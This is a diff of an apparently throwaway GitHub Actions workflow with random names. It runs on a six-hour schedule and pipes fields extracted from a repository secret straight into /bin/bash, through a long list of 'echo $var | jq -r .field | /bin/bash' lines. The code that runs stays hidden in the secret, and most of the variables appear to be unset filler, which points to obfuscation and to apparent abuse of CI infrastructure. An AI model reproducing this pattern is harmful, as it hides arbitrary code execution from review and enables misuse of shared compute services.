@@ -1,27 +1,40 @@
 name: dongkuishi6715
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 0/6 * * *'
+    - cron: '54 1/6 * * *'
 
-jobs:  # 8632
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dongkuishi6715
         env:
-          uchuj88542: ${{ secrets.uchuj88542 }}
+          ji43: ${{ secrets.ji43 }}
         run: |
-          echo $uchuj88542 | jq -r .usrcg1 | /bin/bash
-          echo $n2 | jq -r .psks58 | /bin/bash
-          echo $y7905 | jq -r .d4501 | /bin/bash
-          echo $an55335 | jq -r .dzeth1 | /bin/bash
-          echo $wvqr55 | jq -r .zxmge6232 | /bin/bash
-          echo $hjl0253 | jq -r .sbkmh486 | /bin/bash
-          echo $kxnd796 | jq -r .lbnpt28885 | /bin/bash
-          echo $jk107 | jq -r .cd56227 | /bin/bash
-          echo $zk33419 | jq -r .fw06 | /bin/bash
-          echo $g00984 | jq -r .vfbj9 | /bin/bash
-          echo $e5 | jq -r .oooj0240 | /bin/bash
+          echo $ji43 | jq -r .bbyzf03366 | /bin/bash
+          echo $oevem6 | jq -r .cfykk5330 | /bin/bash
+          echo $dgg5444 | jq -r .v919 | /bin/bash
+          echo $qun045 | jq -r .bhs2 | /bin/bash
+          echo $iogou3 | jq -r .l42 | /bin/bash
+          echo $u18 | jq -r .bxh8732 | /bin/bash
+          echo $lrq4 | jq -r .emwhu6338 | /bin/bash
+          echo $orbhv96 | jq -r .yujt620 | /bin/bash
+          echo $chqjh966 | jq -r .dmrh4 | /bin/bash
+          echo $bduhj9634 | jq -r .kydmj3 | /bin/bash
+          echo $nbl965 | jq -r .www505 | /bin/bash
+          echo $jvlai462 | jq -r .rer74567 | /bin/bash
+          echo $zhha151 | jq -r .k94752 | /bin/bash
+          echo $kj6 | jq -r .a149 | /bin/bash
+          echo $umb27 | jq -r .rlouc67065 | /bin/bash
+          echo $l70 | jq -r .kym6 | /bin/bash
+          echo $yxws23 | jq -r .gdiv1064 | /bin/bash
+          echo $j3 | jq -r .am3890 | /bin/bash
+          echo $lgf16 | jq -r .d6 | /bin/bash
+          echo $ogbep44 | jq -r .jj88139 | /bin/bash
+          echo $sfkrb01552 | jq -r .kecr2 | /bin/bash
+          echo $x715 | jq -r .jv54033 | /bin/bash
 
